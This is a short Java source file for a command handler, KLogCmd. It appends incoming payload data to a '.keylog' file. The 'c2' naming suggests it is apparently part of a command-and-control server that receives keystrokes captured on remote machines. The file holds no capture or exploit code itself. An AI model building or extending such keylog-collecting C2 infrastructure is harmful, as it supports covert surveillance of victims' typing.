package commands;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

import server.CommandServer;
import tools.ParsedCommand;

public class KLogCmd extends ServerCommand {

	public KLogCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {
		StringBuilder sb = new StringBuilder();
		for (int i = 0; i < pCmd.payload.length; i++)
			sb.append((char) pCmd.payload[i]);
		
		try {
			PrintWriter writer = new PrintWriter(
					new FileWriter(pCmd.args[0] + ".keylog", true));
			writer.println(sb.toString());
			writer.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		return DONE;
	}

}
